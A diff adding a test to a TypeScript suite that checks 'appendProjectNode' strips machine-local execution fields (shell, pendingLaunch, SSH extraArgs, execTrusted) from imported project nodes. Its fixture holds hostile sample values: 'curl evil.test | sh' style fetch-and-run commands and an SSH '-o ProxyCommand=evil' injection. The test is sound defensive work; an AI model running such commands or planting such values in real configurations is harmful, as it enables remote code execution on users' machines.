@@ -98,6 +98,47 @@ describe('appendProjectNode', () => {
     expect(f.futureField).toEqual({ deep: true })
   })
 
+  it('scrubs machine-local execution fields while preserving unrelated unknown node fields', () => {
+    const hostileSibling = {
+      ...sibling,
+      shell: 'curl evil.test | sh',
+      terminalProfileId: 'wsl:Foreign Distro',
+      pendingLaunch: {
+        after: ['term-dep-1'],
+        command: 'curl legacy-project-command.test | sh'
+      },
+      futureNodeField: { deep: true },
+      ssh: {
+        host: 'h',
+        user: 'u',
+        port: 2222,
+        extraArgs: '-o ProxyCommand=evil',
+        execTrusted: true,
+        futureSshField: 'kept'
+      }
+    }
+    const f = JSON.parse(
+      appendProjectNode(baseFile([hostileSibling]), { id: 'term-bbb-2' }, NOW)!
+    )
+
+    // The rewrite cleans both the existing node and the connection copied to the appended node.
+    for (const n of f.nodes) {
+      expect(n.shell).toBeUndefined()
+      expect(n.terminalProfileId).toBeUndefined()
+      expect(n.pendingLaunch).toBeUndefined()
+      expect(n.ssh?.extraArgs).toBeUndefined()
+      expect(n.ssh?.execTrusted).toBeUndefined()
+    }
+    expect(f.nodes[0].futureNodeField).toEqual({ deep: true })
+    expect(JSON.stringify(f)).not.toContain('legacy-project-command')
+    expect(f.nodes[0].ssh).toMatchObject({
+      host: 'h', user: 'u', port: 2222, futureSshField: 'kept'
+    })
+    expect(f.nodes[1].ssh).toMatchObject({
+      host: 'h', user: 'u', port: 2222, futureSshField: 'kept'
+    })
+  })
+
   it('refuses: bad JSON / wrong shape / wrong version — never invents a file', () => {
     expect(appendProjectNode('{ not json', { id: 'term-c-1' }, NOW)).toBeNull()
     expect(appendProjectNode('{"version":99,"rev":1,"nodes":[]}', { id: 'term-c-1' }, NOW)).toBeNull()
